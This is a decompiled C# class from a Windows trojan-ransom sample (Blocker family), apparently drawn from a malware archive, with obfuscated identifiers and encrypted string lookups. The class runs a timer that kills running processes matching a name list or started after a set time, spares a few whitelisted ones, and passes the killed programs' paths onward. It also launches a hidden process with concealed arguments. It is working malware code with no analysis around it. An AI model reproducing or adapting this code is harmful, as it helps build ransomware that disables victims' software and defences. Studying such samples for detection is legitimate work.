// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AV, Version=2.0.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 56F2F6CB-C947-430A-8E47-6539AD6C5806
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.lavj-da251cb9358d6e9aaf7cf1499e2912744800b0ad4fe523a6f79298565ec0ebb7.exe

using System;
using System.Diagnostics;
using System.Timers;

internal sealed class \u000F\u2002
{
  private double \u0002;
  private DateTime \u0003;
  private Timer \u0005;

  public \u000F\u2002()
  {
    DateTime dateTime = DateTime.Now.AddSeconds((double) \u0008\u2000.\u0006\u2000);
    this.\u0003 = new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, dateTime.Hour, dateTime.Minute, dateTime.Second, dateTime.Millisecond);
    this.\u0002 = \u0008\u2000.\u0008\u2000;
  }

  public void \u0002()
  {
    this.\u0005 = new Timer();
    this.\u0005.Elapsed += new ElapsedEventHandler(this.\u0002);
    this.\u0005.AutoReset = true;
    this.\u0005.Enabled = true;
    this.\u0005.Start();
  }

  public void \u0003()
  {
    if (this.\u0005 == null)
      return;
    this.\u0005.Enabled = false;
    this.\u0005.Stop();
  }

  private void \u0002(object _param1, ElapsedEventArgs _param2)
  {
    foreach (Process process in Process.GetProcesses())
      this.\u0002(process);
  }

  private void \u0002(Process _param1)
  {
    string str1 = \u000F\u2001.\u0002(_param1.Id);
    try
    {
      if (_param1 == null || !(str1 != \u0005\u2003.\u0002(1603289513)) || !(str1 != \u0005\u2003.\u0002(1603289523)) || !(str1 != \u0005\u2003.\u0002(1603290056)))
        return;
      if (!(\u000F\u2001.\u0002(_param1) > this.\u0003))
      {
        if (!\u000F\u2002.\u0002(_param1))
          return;
      }
      try
      {
        string empty = string.Empty;
        string str2;
        try
        {
          str2 = _param1.MainModule.FileName;
        }
        catch
        {
          str2 = _param1.ProcessName;
        }
        _param1.Kill();
        \u0002\u2003.\u0003(str2);
      }
      catch
      {
      }
    }
    catch
    {
    }
  }

  private static bool \u0002(Process _param0)
  {
    string processName = _param0.ProcessName;
    foreach (string str in \u0008\u2000.\u000E\u2000)
    {
      if (str == processName)
        return true;
    }
    return false;
  }

  private static void \u0002()
  {
    try
    {
      ProcessStartInfo processStartInfo = new ProcessStartInfo(\u0005\u2003.\u0002(1603289490), \u0005\u2003.\u0002(1603305059));
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      Process process = new Process();
      process.StartInfo = processStartInfo;
      process.Start();
      process.WaitForExit();
    }
    catch
    {
    }
  }
}
